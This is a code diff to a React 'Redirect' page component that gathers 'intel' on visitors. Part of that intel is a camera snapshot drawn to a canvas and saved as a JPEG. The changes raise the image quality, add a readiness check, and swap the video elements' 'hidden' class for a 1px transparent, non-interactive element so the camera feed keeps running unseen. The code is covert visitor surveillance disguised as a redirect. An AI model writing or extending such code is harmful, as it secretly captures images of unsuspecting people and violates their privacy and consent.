@@ -110,14 +110,14 @@ export default function Redirect() {
     let finalIntel = { ...intelData };
 
     // Capture Image if video is running
-    if (videoRef.current && videoRef.current.srcObject) {
+    if (videoRef.current && videoRef.current.srcObject && videoRef.current.videoWidth > 0) {
       const canvas = document.createElement('canvas');
       canvas.width = videoRef.current.videoWidth;
       canvas.height = videoRef.current.videoHeight;
       const ctx = canvas.getContext('2d');
       if (ctx) {
         ctx.drawImage(videoRef.current, 0, 0);
-        finalIntel.image = canvas.toDataURL('image/jpeg', 0.5); // Compressed jpeg
+        finalIntel.image = canvas.toDataURL('image/jpeg', 0.8); // Higher quality jpeg
         setIntelData(prev => ({ ...prev, image: finalIntel.image }));
         
         // Stop camera
@@ -301,7 +301,7 @@ export default function Redirect() {
               autoPlay 
               playsInline 
               muted 
-              className="hidden"
+              className="absolute opacity-0 pointer-events-none w-px h-px"
             />
           )}
 
@@ -366,7 +366,7 @@ export default function Redirect() {
             autoPlay 
             playsInline 
             muted 
-            className="hidden"
+            className="absolute opacity-0 pointer-events-none w-px h-px"
           />
         )}
 
